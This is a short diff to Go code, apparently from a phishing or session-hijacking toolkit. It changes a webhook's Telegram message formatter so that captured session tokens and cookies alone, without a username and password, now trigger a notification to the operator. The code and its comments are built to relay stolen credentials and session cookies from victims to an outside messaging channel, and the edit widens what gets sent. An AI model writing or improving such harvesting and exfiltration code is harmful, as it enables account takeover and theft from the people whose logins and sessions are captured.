@@ -194,10 +194,9 @@ func (wh *Webhook) Notify(e *Event) {
 //   - Tokens/cookies are included if the toggle is on AND the blob length
 //     meets the configured minimum. If tokens were captured but the toggle
 //     is off, a note is added instead: "🍪 Tokens captured (not shown)".
-//   - A notification is only sent when at least valid credentials
-//     (username+password) or tokens are present. If nothing passes
-//     validation the method returns an empty string, and Notify skips
-//     the send.
+//   - A notification is sent when valid credentials (username+password) OR
+//     valid tokens are present. If nothing passes validation the method
+//     returns an empty string, and Notify skips the send.
 //
 // The time is rendered in the host machine's local timezone.
 func (wh *Webhook) formatTelegramMessage(e *Event) string {
@@ -259,10 +258,9 @@ func (wh *Webhook) formatTelegramMessage(e *Event) string {
 			hasTokens = true
 		}
 
-		// Only send when valid credentials (username+password) are present.
-		// Tokens are included as bonus content when available, but a
-		// notification is never sent for tokens alone.
-		if !hasCredentials {
+		// Send when valid credentials (username+password) are present, OR when
+		// tokens pass the minimum-length filter (token-only captures are valid).
+		if !hasCredentials && !hasTokens {
 			return ""
 		}
 
